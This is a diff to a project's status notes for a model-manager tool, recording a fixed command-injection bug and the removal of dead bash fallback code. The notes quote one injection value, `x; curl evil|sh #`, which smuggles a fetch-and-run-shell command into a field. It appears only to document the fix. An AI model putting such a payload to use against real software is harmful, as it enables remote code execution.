@@ -48,11 +48,14 @@ JSON with `repo: "x; curl evil|sh #"` produced a launcher that ran it. The bash
 implementation validated these; the port dropped it. `_validate_accept_fields()` now
 rejects every interpolated field before anything is written, with regression tests.
 
-Remaining, not blocking: the Python `cmd_list` prints only accepted models, where the
-bash one also showed Profiles / Launchers / Pending Selections / Remote Cache.
-Pending selections are invisible from the CLI. `MODEL_MANAGER_PY` is hardcoded
-(`scripts/model-manager.sh:22`) so the bash fallbacks holding those features are
-unreachable dead code — delete them or restore the features.
+Then deleted the unreachable bash fallbacks they sat behind: `status` and `list` now
+always use the Python backend, and `model-manager.sh` drops from 2911 to 2147 lines
+(19 functions). Only 6 were orphaned by that change — the other 13, including
+`is_safe_generated_name` and `validate_launcher_write_target`, had been dead since the
+port and had exactly one reference in the file: their own definition.
+
+Accepted consequence: pending selections and remote cache inventory are no longer
+visible from the CLI. That is the UI's job now.
 
 ## Pending
 
